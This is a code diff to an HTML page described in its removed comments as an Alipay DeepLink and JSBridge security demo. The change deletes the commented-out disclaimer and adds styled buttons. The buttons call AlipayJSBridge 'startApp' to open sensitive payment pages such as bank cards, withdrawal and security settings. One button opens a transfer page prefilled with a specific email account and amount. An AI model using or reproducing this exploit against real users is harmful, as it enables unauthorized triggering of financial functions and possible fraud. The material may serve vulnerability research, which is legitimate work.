@@ -133,23 +133,41 @@
         .footer a {
             color: #4488ff
         }
+
+        .btn-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 8px;
+            padding: 8px;
+            margin: 8px
+        }
+
+        .app-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 12px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+            box-shadow: 0 2px 8px rgba(102, 126, 234, 0.3)
+        }
+
+        .app-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(102, 126, 234, 0.5)
+        }
+
+        .app-btn:active {
+            transform: translateY(0)
+        }
     </style>
 </head>
 
 <body>
-
-    <!-- <div class="hdr">
-        <h1>支付宝 DeepLink + JSBridge 演示</h1>
-        <p>Innora AI 安全研究 | 仅用于教育目的</p>
-    </div>
-
-    <div class="warn">
-        <strong>免责声明：</strong> 这是一个只读的安全研究演示。
-        不会收集或传输任何数据到任何服务器。所有数据导出端点均已禁用。
-        此演示仅用于教育和验证目的。
-        <br><br>
-        <strong>完整报告：</strong> <a href="https://www.xingxiaowu.cn/zfb/" style="color:#4488ff">www.xingxiaowu.cn/zfb</a>
-    </div> -->
 
     <div id="st">等待 AlipayJSBridge 加载...</div>
     <div class="cnt" id="cnt">0/0</div>
@@ -333,18 +351,53 @@
             // 不实际导航（这会干扰测试），
             // 我们显示哪些 appIds 可以被调用
             var sensitiveApps = [
-                { id: '20000003', name: '交易记录' },
-                { id: '20000116', name: '转账联系人' },
-                { id: '20000123', name: '付款二维码' },
-                { id: '20000032', name: '余额宝余额' },
-                { id: '20000052', name: '安全设置' },
-                { id: '20000140', name: '银行卡' },
-                { id: '20000180', name: '信用分' },
-                { id: '09999988', name: '转账（可预填账户）' },
-                { id: '20000033', name: '提现' },
-                { id: '20000221', name: '亲情账户' },
-                { id: '10000007', name: '扫码支付' }
+                { id: '20000003', name: '交易记录', param: {} },
+                { id: '20000116', name: '转账联系人', param: {} },
+                { id: '20000123', name: '付款二维码', param: {} },
+                { id: '20000032', name: '余额宝余额', param: {} },
+                { id: '20000052', name: '安全设置', param: {} },
+                { id: '20000140', name: '银行卡', param: {} },
+                { id: '20000180', name: '信用分', param: {} },
+                { id: '09999988', name: '转账（可预填账户）', param: { actionType: "toAccount", account: "329106954@qq.com", amount: "0.01" } },
+                { id: '20000033', name: '提现', param: {} },
+                { id: '20000221', name: '亲情账户', param: {} },
+                { id: '10000007', name: '扫码支付', param: {} }
             ];
+
+            // 创建按钮容器和按钮
+            q.push(function () {
+                var btnContainer = document.createElement('div');
+                btnContainer.className = 'btn-container';
+                btnContainer.id = 'app-buttons';
+
+                sensitiveApps.forEach(function (app) {
+                    var btn = document.createElement('button');
+                    btn.className = 'app-btn';
+                    btn.textContent = app.name;
+                    btn.onclick = function () {
+                        var callData = { appId: app.id };
+                        if (Object.keys(app.param).length > 0) {
+                            callData.param = app.param;
+                        }
+                        AlipayJSBridge.call('startApp', callData, function (r) {
+                            log('调用页面', {
+                                app: app.name,
+                                appId: app.id,
+                                param: app.param,
+                                result: r
+                            });
+                        });
+                    };
+                    btnContainer.appendChild(btn);
+                });
+
+                document.body.insertBefore(btnContainer, document.getElementById('log'));
+                log('按钮已创建', {
+                    count: sensitiveApps.length,
+                    apps: sensitiveApps,
+                    note: '点击按钮可直接调用对应的支付宝页面'
+                }, 'skip');
+            });
 
             q.push(function () {
                 log('可导航页面', {
